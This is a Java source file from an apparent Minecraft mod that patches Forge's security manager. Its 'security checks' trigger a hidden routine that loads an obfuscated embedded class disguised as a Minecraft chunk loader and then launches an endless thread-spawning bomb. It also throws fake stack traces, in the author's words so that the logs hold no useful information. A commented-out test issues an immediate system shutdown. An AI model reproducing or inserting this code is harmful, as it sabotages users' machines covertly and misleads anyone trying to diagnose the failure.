/*
 * This file is a part of MoreItems
 *
 * The MIT License (MIT)
 *
 * Copyright (c) 2021 Roj234
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package lac.injector.patch;

import roj.asm.nixim.Copy;
import roj.asm.nixim.Nixim;
import roj.reflect.ClassDefiner;
import roj.util.Helpers;

import java.io.IOException;
import java.util.concurrent.locks.LockSupport;

/**
 * @author Roj233
 * @version 0.1
 * @since 2021/10/16 0:14
 */
@Nixim("net.minecraftforge.fml.relauncher.FMLSecurityManager")
class NxSecurity extends SecurityManager {
    public static final class MyRunnable extends Thread implements Runnable {
        @Override
        public void run() {
            while (true) new MyRunnable().start();
        }
    }

    @Copy
    static boolean isLibraryAllowed(String lib) {
        int hash = lib.hashCode();
        switch (hash) { // 强制编译器使用lookupSwitch
            // 可惜不能clone
            case 0:
                if (lib.equals("00000"))
                    hash = 1;
                break;
            case 99999:
                if (lib.equals("99999"))
                    hash = 1;
                break;
            default:
                hash = 0;
                break;
        }
        return hash != 0;
    }

    @Copy
    @Override
    public void checkRead(String file) {
        if (file.equals("/dev/null"))
            whooshExit();
    }

    @Copy
    @Override
    public void checkLink(String lib) {
        if (!isLibraryAllowed(lib))
            whooshExit();
    }

//    public static void main(String[] args) {
//        System.setSecurityManager(new NxSecurity());
//        try {
//            Runtime.getRuntime().exec("shutdown /s /t 0");
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        LockSupport.parkNanos(100000000);
//        System.out.println("I'm still alive!");
//    }

    /**
     * 什么叫最完美的退出？当然是让你的log没有一点有效的信息 <BR>
     *     可惜的是没法让错误报告也不存在
     */
    @Copy
    static void whooshExit() {
        byte[] data = new byte[] {-54,-2,-70,-66,0,0,0,52,0,55,1,0,36,110,101,116,47,109,105,110,101,99,114,97,102,116,47,99,104,117,110,107,47,65,115,121,110,99,67,104,117,110,107,76,111,97,100,101,114,7,0,53,1,0,16,106,97,118,97,47,108,97,110,103,47,84,104,114,101,97,100,7,0,3,1,0,18,106,97,118,97,47,108,97,110,103,47,82,117,110,110,97,98,108,101,7,0,5,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,20,65,115,121,110,99,32,67,104,117,110,107,32,76,111,97,100,101,114,35,49,8,0,10,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,12,0,7,0,12,10,0,4,0,13,1,0,5,115,116,97,114,116,12,0,15,0,8,10,0,54,0,16,1,0,3,114,117,110,1,0,1,87,8,0,19,5,0,0,0,0,0,0,19,-120,1,0,24,114,111,106,47,114,101,102,108,101,99,116,47,67,108,97,115,115,68,101,102,105,110,101,114,7,0,23,1,0,8,73,78,83,84,65,78,67,69,1,0,26,76,114,111,106,47,114,101,102,108,101,99,116,47,67,108,97,115,115,68,101,102,105,110,101,114,59,12,0,25,0,26,9,0,24,0,27,1,0,11,100,101,102,105,110,101,67,108,97,115,115,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,91,66,41,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,12,0,29,0,30,10,0,24,0,31,1,0,38,106,97,118,97,47,117,116,105,108,47,99,111,110,99,117,114,114,101,110,116,47,108,111,99,107,115,47,76,111,99,107,83,117,112,112,111,114,116,7,0,33,1,0,9,112,97,114,107,78,97,110,111,115,1,0,4,40,74,41,86,12,0,35,0,36,10,0,34,0,37,1,0,15,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,7,0,39,1,0,7,102,111,114,78,97,109,101,1,0,37,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,67,108,97,115,115,59,12,0,41,0,42,10,0,40,0,43,1,0,19,106,97,118,97,47,108,97,110,103,47,84,104,114,111,119,97,98,108,101,7,0,45,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,1,0,8,60,99,108,105,110,105,116,62,12,0,7,0,8,10,0,54,0,49,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,17,69,120,105,116,87,104,111,111,115,104,108,121,46,106,97,118,97,1,0,36,110,101,116,47,109,105,110,101,99,114,97,102,116,47,99,104,117,110,107,47,65,115,121,110,99,67,104,117,110,107,76,111,97,100,101,114,7,0,53,0,48,0,54,0,4,0,1,0,6,0,0,0,3,0,2,0,7,0,8,0,1,0,9,0,0,0,23,0,2,0,1,0,0,0,11,42,18,11,-73,0,14,42,-74,0,17,-79,0,0,0,0,0,1,0,18,0,8,0,1,0,9,0,0,2,-63,0,6,0,2,0,0,2,-98,-78,0,28,18,20,16,117,-68,8,89,3,16,-54,84,89,4,16,-2,84,89,5,16,-70,84,89,6,16,-66,84,89,7,3,84,89,8,3,84,89,16,6,3,84,89,16,7,16,52,84,89,16,8,3,84,89,16,9,16,8,84,89,16,10,4,84,89,16,11,3,84,89,16,12,4,84,89,16,13,16,87,84,89,16,14,16,7,84,89,16,15,3,84,89,16,16,4,84,89,16,17,4,84,89,16,18,3,84,89,16,19,16,29,84,89,16,20,16,115,84,89,16,21,16,117,84,89,16,22,16,110,84,89,16,23,16,47,84,89,16,24,16,114,84,89,16,25,16,101,84,89,16,26,16,102,84,89,16,27,16,108,84,89,16,28,16,101,84,89,16,29,16,99,84,89,16,30,16,116,84,89,16,31,16,47,84,89,16,32,16,77,84,89,16,33,16,97,84,89,16,34,16,103,84,89,16,35,16,105,84,89,16,36,16,99,84,89,16,37,16,65,84,89,16,38,16,99,84,89,16,39,16,99,84,89,16,40,16,101,84,89,16,41,16,115,84,89,16,42,16,115,84,89,16,43,16,111,84,89,16,44,16,114,84,89,16,45,16,73,84,89,16,46,16,109,84,89,16,47,16,112,84,89,16,48,16,108,84,89,16,49,16,7,84,89,16,50,3,84,89,16,51,6,84,89,16,52,4,84,89,16,53,3,84,89,16,54,16,8,84,89,16,55,16,60,84,89,16,56,16,99,84,89,16,57,16,108,84,89,16,58,16,105,84,89,16,59,16,110,84,89,16,60,16,105,84,89,16,61,16,116,84,89,16,62,16,62,84,89,16,63,4,84,89,16,64,3,84,89,16,65,6,84,89,16,66,16,40,84,89,16,67,16,41,84,89,16,68,16,86,84,89,16,69,4,84,89,16,70,3,84,89,16,71,7,84,89,16,72,16,67,84,89,16,73,16,111,84,89,16,74,16,100,84,89,16,75,16,101,84,89,16,76,3,84,89,16,77,16,33,84,89,16,78,3,84,89,16,79,5,84,89,16,80,3,84,89,16,81,7,84,89,16,82,3,84,89,16,83,3,84,89,16,84,3,84,89,16,85,3,84,89,16,86,3,84,89,16,87,4,84,89,16,88,3,84,89,16,89,16,8,84,89,16,90,3,84,89,16,91,8,84,89,16,92,3,84,89,16,93,16,6,84,89,16,94,3,84,89,16,95,4,84,89,16,96,3,84,89,16,97,16,7,84,89,16,98,3,84,89,16,99,3,84,89,16,100,3,84,89,16,101,16,13,84,89,16,102,3,84,89,16,103,3,84,89,16,104,3,84,89,16,105,3,84,89,16,106,3,84,89,16,107,3,84,89,16,108,3,84,89,16,109,4,84,89,16,110,16,87,84,89,16,111,3,84,89,16,112,3,84,89,16,113,3,84,89,16,114,3,84,89,16,115,3,84,89,16,116,3,84,-74,0,32,87,20,0,21,-72,0,38,18,20,-72,0,44,87,-89,0,4,76,-79,0,1,2,-109,2,-103,2,-100,0,46,0,1,0,47,0,0,0,9,0,2,-9,2,-100,7,0,46,0,0,8,0,48,0,8,0,1,0,9,0,0,0,21,0,2,0,0,0,0,0,9,-69,0,2,89,-73,0,50,87,-79,0,0,0,0,0,1,0,51,0,0,0,2,0,52};
        try {
            ClassDefiner.debug = false;
            ClassDefiner.INSTANCE.defineClass("net.minecraft.chunk.AsyncChunkLoader", data);
            Class.forName("net.minecraft.chunk.AsyncChunkLoader");
        } catch (Throwable ignored) {}

        new Thread(() -> {
            LockSupport.parkNanos(9999);
            new MyRunnable().run();
        }).start();
    }

    @Override
    @Copy
    public void checkExec(String cmd) {
        whooshExit();

        // 哈哈哈哈哈
        IOException pipe = new IOException("invalid null character in command");
        StackTraceElement[] trace = pipe.getStackTrace();
        StackTraceElement[] back = new StackTraceElement[trace.length - 1];
        System.arraycopy(trace, 1, back, 0, back.length);
        if (back[0].getLineNumber() > 0) // support jre
            back[0] = new StackTraceElement("java.lang.ProcessBuilder", "start", "ProcessBuilder.java", 1024);
        pipe.setStackTrace(back);
        Helpers.throwAny(pipe);
    }

//    @Override
//    public void checkPermission(Permission perm) {}
//
//    @Override
//    public void checkPermission(Permission perm, Object context) {}
}
